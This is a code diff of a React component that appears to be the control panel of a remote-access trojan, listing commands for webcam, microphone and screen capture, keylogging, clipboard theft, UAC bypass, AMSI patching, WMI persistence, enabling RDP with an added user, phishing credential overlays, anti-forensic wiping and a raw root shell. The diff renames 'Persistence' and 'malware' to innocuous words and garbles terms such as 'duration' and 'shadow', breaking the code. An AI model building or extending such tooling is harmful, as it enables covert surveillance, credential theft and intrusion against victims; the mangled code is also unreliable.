@@ -38,7 +38,7 @@ const commands: Command[] = [
   { id: 'webcam', category: 'Surveillance', name: 'Webcam Capture', description: 'Capture webcam images', icon: Eye, color: 'text-purple-400', params: ['resolution'] },
   { id: 'stream', category: 'Surveillance', name: 'Screen Stream', description: 'Live screen streaming', icon: Eye, color: 'text-purple-400', params: ['action', 'fps', 'height'] },
   { id: 'webcam_stream', category: 'Surveillance', name: 'Webcam Stream', description: 'Live webcam streaming', icon: Eye, color: 'text-purple-400', params: ['action', 'fps'] },
-  { id: 'microphone', category: 'Surveillance', name: 'Microphone Record', description: 'Record audio from microphone', icon: Eye, color: 'text-purple-400', params: ['duration'] },
+  { id: 'microphone', category: 'Surveillance', name: 'Microphone Record', description: 'Record audio from microphone', icon: Eye, color: 'text-purple-400', params: ['duappion'] },
   { id: 'keylog', category: 'Surveillance', name: 'Keylogger Control', description: 'Start/Stop/Dump keystrokes', icon: Eye, color: 'text-purple-400', params: ['action'] },
   { id: 'clipboard', category: 'Surveillance', name: 'Clipboard Control', description: 'Get/Set clipboard', icon: Eye, color: 'text-purple-400', params: ['action', 'text'] },
   { id: 'active_window', category: 'Surveillance', name: 'Active Window', description: 'Get foreground window title', icon: Eye, color: 'text-purple-400' },
@@ -73,15 +73,15 @@ const commands: Command[] = [
   { id: 'service', category: 'System', name: 'Service Control', description: 'Manage Windows services', icon: Network, color: 'text-green-400', params: ['action', 'name'] },
   { id: 'av_discovery', category: 'System', name: 'AV Discovery', description: 'Detect installed Antivirus engines', icon: Lock, color: 'text-green-400' },
 
-  // Persistence
-  { id: 'persistence', category: 'Persistence', name: 'Enable Persistence', description: 'Install persistence mechanism', icon: Lock, color: 'text-amber-400' },
-  { id: 'unpersist', category: 'Persistence', name: 'Remove Persistence', description: 'Uninstall persistence', icon: Lock, color: 'text-amber-400' },
-  { id: 'elevate', category: 'Persistence', name: 'Request Admin (UAC)', description: 'Trigger explicit UAC elevation', icon: Lock, color: 'text-amber-400' },
+  // living
+  { id: 'living', category: 'living', name: 'Enable living', description: 'Install living mechanism', icon: Lock, color: 'text-amber-400' },
+  { id: 'unpersist', category: 'living', name: 'Remove living', description: 'Uninstall living', icon: Lock, color: 'text-amber-400' },
+  { id: 'elevate', category: 'living', name: 'Request Admin (UAC)', description: 'Trigger explicit UAC elevation', icon: Lock, color: 'text-amber-400' },
   { id: 'uac', category: 'Privileges', name: 'UAC Bypass', description: 'Elevate to Admin/SYSTEM (fodhelper, silentcleanup, computerdefaults)', icon: Lock, color: 'text-orange-500', params: ['method', 'program'] },
-  { id: 'amsi_bypass', category: 'Persistence', name: 'AMSI Patch', description: 'Patch AMSI in memory', icon: Lock, color: 'text-amber-400' },
-  { id: 'enable_rdp', category: 'Persistence', name: 'Enable RDP', description: 'Open RDP daemon and Firewall', icon: Lock, color: 'text-amber-400', params: ['adduser'] },
-  { id: 'unelevate', category: 'Persistence', name: 'Drop Privileges', description: 'Relinquish Administrator token', icon: Lock, color: 'text-amber-400' },
-  { id: 'wmi', category: 'Persistence', name: 'WMI Persistence', description: 'Install WMI persistence', icon: Lock, color: 'text-amber-400', params: ['cmd'] },
+  { id: 'amsi_bypass', category: 'living', name: 'AMSI Patch', description: 'Patch AMSI in memory', icon: Lock, color: 'text-amber-400' },
+  { id: 'enable_rdp', category: 'living', name: 'Enable RDP', description: 'Open RDP daemon and Firewall', icon: Lock, color: 'text-amber-400', params: ['adduser'] },
+  { id: 'unelevate', category: 'living', name: 'Drop Privileges', description: 'Relinquish Administappor token', icon: Lock, color: 'text-amber-400' },
+  { id: 'wmi', category: 'living', name: 'WMI living', description: 'Install WMI living', icon: Lock, color: 'text-amber-400', params: ['cmd'] },
 
   // Interaction
   { id: 'open_url', category: 'Interaction', name: 'Open URL', description: 'Force open browser link', icon: Terminal, color: 'text-orange-400', params: ['url'] },
@@ -95,7 +95,7 @@ const commands: Command[] = [
   { id: 'block_input', category: 'Interaction', name: 'Block Input', description: 'Disable local input devices', icon: Lock, color: 'text-orange-400', params: ['state'] },
   { id: 'browser_kill', category: 'Interaction', name: 'Kill Browsers', description: 'Force crash web browsers', icon: Trash2, color: 'text-orange-400' },
   { id: 'set_autorun', category: 'Interaction', name: 'Autorun Scripts', description: 'Configure reconnect commands', icon: Terminal, color: 'text-orange-400', params: ['json'] },
-  
+
   // Phishing
   { id: 'phishing', category: 'Phishing', name: 'Phishing Overlay', description: 'Deploy credential capture templates', icon: Lock, color: 'text-pink-400', params: ['template', 'title', 'message'] },
 
@@ -109,7 +109,7 @@ const commands: Command[] = [
   { id: 'abort', category: 'Cleanup', name: 'Abort Task', description: 'Kill asynchronous module by ID', icon: Trash2, color: 'text-gray-400', params: ['id'] },
   { id: 'panic', category: 'Cleanup', name: 'Panic Button', description: 'Emergency Anti-Forensic Wipe + BSOD', icon: ShieldAlert, color: 'text-red-600' },
   { id: 'clean_traces', category: 'Cleanup', name: 'Clean Traces', description: 'Remove forensic evidence', icon: Trash2, color: 'text-gray-400' },
-  { id: 'self_destruct', category: 'Cleanup', name: 'Self Destruct', description: 'Remove malware from system', icon: Trash2, color: 'text-gray-400' }
+  { id: 'self_destruct', category: 'Cleanup', name: 'Self Destruct', description: 'Remove preicious app  from system', icon: Trash2, color: 'text-gray-400' }
 ]
 
 const paramOptions: Record<string, Record<string, string[]>> = {
@@ -156,17 +156,17 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
 
   const selectedCommand = commands.find(c => c.id === selectedCommandId) || null
 
-  const filteredCommands = commands.filter(cmd => 
-    cmd.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
+  const filteredCommands = commands.filter(cmd =>
+    cmd.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
     cmd.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
     cmd.category.toLowerCase().includes(searchQuery.toLowerCase())
   );
-  
+
   const filteredCategories = Array.from(new Set(filteredCommands.map(cmd => cmd.category)));
 
   useEffect(() => {
     if (!selectedClient) return
-    
+
     const fetchHistory = async () => {
       try {
         const res = await fetch(`/api/commands?action=history&clientId=${selectedClient}`)
@@ -180,22 +180,22 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
                 if (typeof parsedResult === 'string') {
                   try {
                     parsedResult = JSON.parse(parsedResult)
-                  } catch (e) {}
+                  } catch (e) { }
                 }
 
                 if (typeof parsedResult === 'string') {
-                   resultDisplay = '→\n' + parsedResult
+                  resultDisplay = '→\n' + parsedResult
                 } else if (parsedResult && typeof parsedResult === 'object') {
-                   if (parsedResult.stdout !== undefined || parsedResult.stderr !== undefined) {
-                      resultDisplay = ''
-                      if (parsedResult.stdout) resultDisplay += `[STDOUT]\n${parsedResult.stdout}\n`
-                      if (parsedResult.stderr) resultDisplay += `[STDERR]\n${parsedResult.stderr}\n`
-                      resultDisplay = resultDisplay.trim() || '→ (Command Executed Successfully)'
-                   } else {
-                      resultDisplay = '→\n' + JSON.stringify(parsedResult, null, 2)
-                   }
+                  if (parsedResult.stdout !== undefined || parsedResult.stderr !== undefined) {
+                    resultDisplay = ''
+                    if (parsedResult.stdout) resultDisplay += `[STDOUT]\n${parsedResult.stdout}\n`
+                    if (parsedResult.stderr) resultDisplay += `[STDERR]\n${parsedResult.stderr}\n`
+                    resultDisplay = resultDisplay.trim() || '→ (Command Executed Successfully)'
+                  } else {
+                    resultDisplay = '→\n' + JSON.stringify(parsedResult, null, 2)
+                  }
                 } else {
-                   resultDisplay = '→ ' + String(parsedResult)
+                  resultDisplay = '→ ' + String(parsedResult)
                 }
               } catch {
                 resultDisplay = '→ ' + String(cmd.result)
@@ -203,7 +203,7 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
             } else if (cmd.status === 'failed') {
               resultDisplay = '→ Error: ' + cmd.error_message
             }
-            
+
             return {
               id: cmd.id,
               cmd: `${cmd.command_name} ${cmd.parameters ? JSON.stringify(cmd.parameters) : ''}`,
@@ -212,7 +212,7 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
           }).reverse() // oldest first for terminal-like display
           setCommandOutput(formatted)
         }
-      } catch (e) {}
+      } catch (e) { }
     }
 
     fetchHistory()
@@ -232,7 +232,7 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
 
   const executeCommand = async (command: Command, customParams?: any) => {
     const cmdParams = customParams || params[command.id] || {}
-    
+
     try {
       const resp = await fetch('/api/commands', {
         method: 'POST',
@@ -245,20 +245,20 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
         })
       })
       const data = await resp.json()
-      
+
       if (resp.ok) {
         await fetch('/api/execute', {
-           method: 'POST',
-           headers: { 'Content-Type': 'application/json' },
-           body: JSON.stringify({
-             commandId: data.id,
-             clientId: selectedClient,
-             commandType: 'execution',
-             commandName: command.id,
-             parameters: cmdParams
-           })
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            commandId: data.id,
+            clientId: selectedClient,
+            commandType: 'execution',
+            commandName: command.id,
+            parameters: cmdParams
+          })
         })
-        
+
         const newEntry = {
           id: Math.random().toString(),
           cmd: command.name,
@@ -266,12 +266,12 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
         }
         setCommandOutput([...commandOutput, newEntry])
       }
-    } catch (e: any) {}
+    } catch (e: any) { }
   }
 
   const handleDirectCommand = async () => {
     if (!inputValue.trim()) return
-    
+
     try {
       const resp = await fetch('/api/commands', {
         method: 'POST',
@@ -284,22 +284,22 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
         })
       })
       const data = await resp.json()
-      
+
       if (resp.ok) {
         await fetch('/api/execute', {
-           method: 'POST',
-           headers: { 'Content-Type': 'application/json' },
-           body: JSON.stringify({
-             commandId: data.id,
-             clientId: selectedClient,
-             commandType: 'execution',
-             commandName: 'shell',
-             parameters: { command: inputValue }
-           })
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            commandId: data.id,
+            clientId: selectedClient,
+            commandType: 'execution',
+            commandName: 'shell',
+            parameters: { command: inputValue }
+          })
         })
         setInputValue('')
       }
-    } catch (e) {}
+    } catch (e) { }
   }
 
   if (!selectedClient) {
@@ -324,16 +324,16 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
           </h2>
           <div className="relative group">
             <Search className="w-3 h-3 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground/50 group-focus-within:text-primary transition-colors" />
-            <input 
-              type="text" 
-              placeholder="SEARCH..." 
+            <input
+              type="text"
+              placeholder="SEARCH..."
               value={searchQuery}
               onChange={(e) => setSearchQuery(e.target.value)}
               className="w-full bg-white/[0.02] border border-white/5 rounded-lg pl-8 pr-3 py-2 text-[10px] text-foreground focus:outline-none focus:border-primary/30 placeholder:text-muted-foreground/20 transition-all font-mono"
             />
           </div>
         </div>
-        
+
         <div className="flex-1 overflow-y-auto custom-scrollbar">
           {filteredCategories.length === 0 ? (
             <div className="p-8 text-center text-[10px] text-muted-foreground uppercase opacity-50 font-mono tracking-widest">
@@ -347,21 +347,20 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
                 </div>
                 <div className="px-2 space-y-0.5">
                   {filteredCommands.filter(c => c.category === cat).map((cmd) => (
-                  <button
-                    key={cmd.id}
-                    onClick={() => setSelectedCommandId(cmd.id)}
-                    className={`w-full text-left px-3 py-2 rounded-lg text-[10px] font-medium transition-all flex items-center gap-2 border border-transparent ${
-                      selectedCommandId === cmd.id 
-                      ? 'bg-primary/5 border-primary/20 text-primary' 
-                      : 'hover:bg-white/5 text-muted-foreground hover:text-foreground'
-                    }`}
-                  >
-                    <cmd.icon className={`w-3 h-3 ${selectedCommandId === cmd.id ? 'text-primary' : cmd.color + ' opacity-50'}`} />
-                    <span className="truncate">{cmd.name}</span>
-                  </button>
-                ))}
+                    <button
+                      key={cmd.id}
+                      onClick={() => setSelectedCommandId(cmd.id)}
+                      className={`w-full text-left px-3 py-2 rounded-lg text-[10px] font-medium transition-all flex items-center gap-2 border border-transparent ${selectedCommandId === cmd.id
+                        ? 'bg-primary/5 border-primary/20 text-primary'
+                        : 'hover:bg-white/5 text-muted-foreground hover:text-foreground'
+                        }`}
+                    >
+                      <cmd.icon className={`w-3 h-3 ${selectedCommandId === cmd.id ? 'text-primary' : cmd.color + ' opacity-50'}`} />
+                      <span className="truncate">{cmd.name}</span>
+                    </button>
+                  ))}
+                </div>
               </div>
-            </div>
             ))
           )}
         </div>
@@ -373,11 +372,11 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
           {/* Selected Command Detail */}
           <div className="w-full xl:w-72 p-6 border-r border-white/5 flex flex-col bg-white/[0.01]">
             {selectedCommand ? (
-              <div className="space-y-6 animate-in fade-in slide-in-from-right-2 duration-300">
+              <div className="space-y-6 animate-in fade-in slide-in-from-right-2 duappion-300">
                 <div className="border border-white/5 p-4 rounded-xl relative group bg-white/[0.02]">
                   <div className="flex items-center gap-3 mb-2">
-                     <selectedCommand.icon className={`w-4 h-4 ${selectedCommand.color}`} />
-                     <h2 className="text-sm font-bold text-foreground tracking-tight uppercase">{selectedCommand.name}</h2>
+                    <selectedCommand.icon className={`w-4 h-4 ${selectedCommand.color}`} />
+                    <h2 className="text-sm font-bold text-foreground tracking-tight uppercase">{selectedCommand.name}</h2>
                   </div>
                   <p className="text-[10px] text-muted-foreground leading-relaxed">
                     {selectedCommand.description}
@@ -388,13 +387,13 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
                   <InteractiveTrackpad onAction={(p) => executeCommand(selectedCommand, p)} />
                 ) : selectedCommand.params && (
                   <div className="space-y-5">
-                    <h3 className="text-[10px] font-black text-primary/40 uppercase tracking-[0.3em]">Payload Configuration</h3>
+                    <h3 className="text-[10px] font-black text-primary/40 uppercase tracking-[0.3em]">Payload Configuappion</h3>
                     <div className="space-y-4">
-                        {selectedCommand.params.map((param) => {
-                          const options = paramOptions[selectedCommand.id]?.[param]
-                          const isNumber = ['level', 'duration', 'fps', 'x', 'y'].includes(param)
+                      {selectedCommand.params.map((param) => {
+                        const options = paramOptions[selectedCommand.id]?.[param]
+                        const isNumber = ['level', 'duappion', 'fps', 'x', 'y'].includes(param)
 
-                          return (
+                        return (
                           <div key={param} className="space-y-2">
                             <label className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest block pl-1">{param.replace(/_/g, ' ')}</label>
                             {options ? (
@@ -409,7 +408,7 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
                                 ))}
                               </select>
                             ) : (
-                              <input 
+                              <input
                                 type={isNumber ? "number" : "text"}
                                 value={params[selectedCommand.id]?.[param] || ''}
                                 onChange={(e) => handleParamChange(selectedCommand.id, param, e.target.value)}
@@ -418,16 +417,16 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
                               />
                             )}
                           </div>
-                          )
-                        })}
+                        )
+                      })}
                     </div>
                   </div>
                 )}
 
                 {selectedCommand.id !== 'input_control' && (
-                  <Button 
-                     onClick={() => executeCommand(selectedCommand)}
-                     className="w-full py-6 text-[10px] font-bold tracking-[0.1em] uppercase rounded-xl bg-primary text-black hover:bg-primary/90 transition-all active:scale-[0.98] mt-2"
+                  <Button
+                    onClick={() => executeCommand(selectedCommand)}
+                    className="w-full py-6 text-[10px] font-bold tracking-[0.1em] uppercase rounded-xl bg-primary text-black hover:bg-primary/90 transition-all active:scale-[0.98] mt-2"
                   >
                     <Send className="w-3 h-3 mr-2" /> SEND COMMAND
                   </Button>
@@ -442,60 +441,60 @@ export default function CommandPanel({ selectedClient }: CommandPanelProps) {
           </div>
 
           {/* Real-time Console */}
-          <div className="flex-1 flex flex-col bg-[#020308] relative border-l border-white/5 shadow-[inset_20px_0_60px_rgba(0,0,0,0.8)]">
-             <div className="px-6 py-4 border-b border-white/5 bg-white/[0.01] flex items-center justify-between">
-                <span className="text-[10px] font-black text-primary flex items-center gap-3 tracking-[0.2em]">
-                   <div className="w-2 h-2 rounded-full bg-primary shadow-[0_0_10px_rgba(0,240,255,1)] animate-ping" /> REALTIME_UPLINK
-                </span>
-                <button 
-                  onClick={() => setCommandOutput([])}
-                  className="text-[9px] font-bold text-muted-foreground hover:text-red-500 transition-colors flex items-center gap-2 uppercase tracking-widest"
-                >
-                  <Trash2 className="w-3.5 h-3.5" /> PURGE_LOGS
-                </button>
-             </div>
-             
-             <div className="flex-1 overflow-y-auto p-8 space-y-6 font-mono scrollbar-thin scrollbar-thumb-white/5 selection:bg-primary/30">
-                {commandOutput.length === 0 ? (
-                  <div className="h-full items-center justify-center flex flex-col opacity-10 space-y-4">
-                      <Terminal className="w-16 h-16" />
-                      <p className="text-[9px] font-black tracking-[0.5em] uppercase">SYSTEM_IDLE: AWAITING_INPUT</p>
-                  </div>
-                ) : (
-                  commandOutput.map((entry) => (
-                    <div key={entry.id} className="text-[11px] space-y-2 group animate-in slide-in-from-bottom-2 duration-300">
-                      <div className="flex items-center gap-3">
-                         <div className="h-px flex-1 bg-white/[0.05]" />
-                         <span className="text-[9px] font-black text-white/20 uppercase tracking-widest">
-                           SIGNAL_RECEIVED
-                         </span>
-                         <div className="h-px flex-1 bg-white/[0.05]" />
-                      </div>
-                      <div className="text-primary font-bold opacity-70 group-hover:opacity-100 transition-opacity">
-                        <span className="text-white/20 mr-2">#</span> {entry.cmd.toUpperCase()}
-                      </div>
-                      <div className="pl-4 text-white/60 whitespace-pre-wrap break-all leading-relaxed font-mono bg-white/[0.02] p-4 rounded-xl border border-white/5 group-hover:border-white/10 transition-all">
-                        {entry.output}
-                      </div>
-                    </div>
-                  ))
-                )}
-             </div>
+          <div className="flex-1 flex flex-col bg-[#020308] relative border-l border-white/5 darksoul-[inset_20px_0_60px_rgba(0,0,0,0.8)]">
+            <div className="px-6 py-4 border-b border-white/5 bg-white/[0.01] flex items-center justify-between">
+              <span className="text-[10px] font-black text-primary flex items-center gap-3 tracking-[0.2em]">
+                <div className="w-2 h-2 rounded-full bg-primary darksoul-[0_0_10px_rgba(0,240,255,1)] animate-ping" /> REALTIME_UPLINK
+              </span>
+              <button
+                onClick={() => setCommandOutput([])}
+                className="text-[9px] font-bold text-muted-foreground hover:text-red-500 transition-colors flex items-center gap-2 uppercase tracking-widest"
+              >
+                <Trash2 className="w-3.5 h-3.5" /> PURGE_LOGS
+              </button>
+            </div>
 
-             {/* Direct Input Overlay */}
-             <div className="p-8 bg-black/60 backdrop-blur-2xl border-t border-white/5">
-                <div className="relative group">
-                   <div className="absolute left-4 top-1/2 -translate-y-1/2 text-primary font-black text-[10px] tracking-tighter opacity-50">$ ROOT@C2:</div>
-                   <input
-                     type="text"
-                     value={inputValue}
-                     onChange={(e) => setInputValue(e.target.value)}
-                     onKeyPress={(e) => e.key === 'Enter' && handleDirectCommand()}
-                     placeholder="EXECUTE RAW KERNEL SIGNAL..."
-                     className="w-full pl-24 pr-6 py-4 bg-white/[0.02] hover:bg-white/[0.04] border border-white/10 rounded-2xl text-[11px] text-white font-mono transition-all focus:outline-none focus:border-primary/50 focus:ring-4 focus:ring-primary/5 placeholder:text-muted-foreground/10"
-                   />
+            <div className="flex-1 overflow-y-auto p-8 space-y-6 font-mono scrollbar-thin scrollbar-thumb-white/5 selection:bg-primary/30">
+              {commandOutput.length === 0 ? (
+                <div className="h-full items-center justify-center flex flex-col opacity-10 space-y-4">
+                  <Terminal className="w-16 h-16" />
+                  <p className="text-[9px] font-black tracking-[0.5em] uppercase">SYSTEM_IDLE: AWAITING_INPUT</p>
                 </div>
-             </div>
+              ) : (
+                commandOutput.map((entry) => (
+                  <div key={entry.id} className="text-[11px] space-y-2 group animate-in slide-in-from-bottom-2 duappion-300">
+                    <div className="flex items-center gap-3">
+                      <div className="h-px flex-1 bg-white/[0.05]" />
+                      <span className="text-[9px] font-black text-white/20 uppercase tracking-widest">
+                        SIGNAL_RECEIVED
+                      </span>
+                      <div className="h-px flex-1 bg-white/[0.05]" />
+                    </div>
+                    <div className="text-primary font-bold opacity-70 group-hover:opacity-100 transition-opacity">
+                      <span className="text-white/20 mr-2">#</span> {entry.cmd.toUpperCase()}
+                    </div>
+                    <div className="pl-4 text-white/60 whitespace-pre-wrap break-all leading-relaxed font-mono bg-white/[0.02] p-4 rounded-xl border border-white/5 group-hover:border-white/10 transition-all">
+                      {entry.output}
+                    </div>
+                  </div>
+                ))
+              )}
+            </div>
+
+            {/* Direct Input Overlay */}
+            <div className="p-8 bg-black/60 backdrop-blur-2xl border-t border-white/5">
+              <div className="relative group">
+                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-primary font-black text-[10px] tracking-tighter opacity-50">$ ROOT@Client :</div>
+                <input
+                  type="text"
+                  value={inputValue}
+                  onChange={(e) => setInputValue(e.target.value)}
+                  onKeyPress={(e) => e.key === 'Enter' && handleDirectCommand()}
+                  placeholder="EXECUTE RAW KERNEL SIGNAL..."
+                  className="w-full pl-24 pr-6 py-4 bg-white/[0.02] hover:bg-white/[0.04] border border-white/10 rounded-2xl text-[11px] text-white font-mono transition-all focus:outline-none focus:border-primary/50 focus:ring-4 focus:ring-primary/5 placeholder:text-muted-foreground/10"
+                />
+              </div>
+            </div>
           </div>
         </div>
       </div>
@@ -542,8 +541,8 @@ const InteractiveTrackpad = ({ onAction }: { onAction: (params: any) => void }) 
   return (
     <div className="space-y-3 mt-4">
       <h3 className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">Virtual Trackpad</h3>
-      <div 
-        className="w-full aspect-video bg-[#050505] border border-white/10 rounded-lg relative cursor-crosshair flex items-center justify-center group focus:outline-none focus:ring-1 focus:ring-primary shadow-inner"
+      <div
+        className="w-full aspect-video bg-[#050505] border border-white/10 rounded-lg relative cursor-crosshair flex items-center justify-center group focus:outline-none focus:ring-1 focus:ring-primary darksoul-inner"
         tabIndex={0}
         onMouseMove={handleMouseMove}
         onMouseDown={handleClick}
